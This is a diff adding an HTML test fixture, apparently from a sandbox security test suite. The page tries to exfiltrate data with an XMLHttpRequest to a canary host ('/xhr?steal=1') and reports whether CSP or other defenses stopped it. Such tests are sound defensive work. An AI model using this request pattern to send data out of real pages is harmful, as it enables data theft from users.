@@ -1,0 +1,20 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>attack: XMLHttpRequest</title>
+<!-- ATTACK: exfiltrate via XMLHttpRequest. Same defenses as fetch. -->
+<script>
+  const canary = (window.bridge.getArgs() || {}).canary || {};
+  const r = { attack: 'xhr' };
+  try {
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', canary.http + '/xhr?steal=1');
+    xhr.onload = () => { r.loaded = true; r.status = xhr.status; window.bridge.emit('done', r); };
+    xhr.onerror = () => { r.error = 'onerror'; window.bridge.emit('done', r); };
+    xhr.send();
+    // If CSP blocks synchronously we still report.
+    setTimeout(() => window.bridge.emit('done', { ...r, viaTimeout: true }), 1500);
+  } catch (e) {
+    r.threw = String(e);
+    window.bridge.emit('done', r);
+  }
+</script>
